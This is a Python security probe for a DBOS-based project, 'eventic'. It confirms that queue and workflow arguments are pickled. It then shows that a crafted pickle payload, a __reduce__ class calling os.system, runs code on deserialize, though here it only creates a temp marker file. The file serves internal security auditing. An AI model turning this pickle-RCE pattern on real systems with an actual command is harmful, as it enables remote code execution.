"""probe_04 — Queue/workflow args are pickled (RCE surface).

DBOS 2.29's default serializer is `py_pickle` (base64(pickle.dumps(...))). Every
value that crosses the queue/workflow boundary — including a whole Record when
you write `@evented def m(self): ...` and call `s.m()` — is pickled into the
DBOS system database and unpickled by the worker via pickle.loads().

pickle.loads on attacker-influenced bytes is arbitrary code execution. This
probe (a) confirms the default serializer is pickle, and (b) demonstrates that
a crafted payload in the serialized-arg position executes code on deserialize —
i.e. if the system DB / queue arg is ever attacker-writable, it is game over.

Run: .venv/bin/python .scratch/projects/002-reimplementation/probes/probe_04_pickle_queue_args.py
"""
import tempfile, base64, pickle, os
from eventic import Eventic, Record


class Doc(Record):
    title: str | None = None


class Exploit:
    def __reduce__(self):
        # benign stand-in for `os.system('...')` — writes a marker file
        marker = os.path.join(tempfile.gettempdir(), "eventic_probe04_pwned")
        return (os.system, (f"touch {marker}",))


def main():
    tmp = tempfile.mkdtemp()
    Eventic.init(name="probe04", database_url=f"sqlite:///{tmp}/p.db")
    ser = Eventic.instance()._serializer
    print(f"[a] default serializer                : {type(ser).__name__} (name={ser.name()!r})")

    # a live Record pickles fine as a queue arg (this is what @evented enqueues)
    d = Doc(title="secret")
    enc = ser.serialize(d)
    print(f"[a] a whole Record serializes via      : {ser.name()} "
          f"(-> {len(enc)} base64 chars in the system DB)")

    # (b) crafted payload -> code execution on deserialize
    marker = os.path.join(tempfile.gettempdir(), "eventic_probe04_pwned")
    if os.path.exists(marker):
        os.remove(marker)
    malicious = base64.b64encode(pickle.dumps(Exploit())).decode()
    ser.deserialize(malicious)  # this is exactly what a DBOS worker does to an arg
    print(f"[b] deserialize(crafted arg) executed code? {os.path.exists(marker)} "
          f"(marker file created by the pickle payload)")
    if os.path.exists(marker):
        os.remove(marker)

    Eventic.destroy()
    Eventic.reset()
    print()
    print("=> Any trust boundary reaching an enqueue arg or the DBOS system DB is an RCE.")


if __name__ == "__main__":
    main()
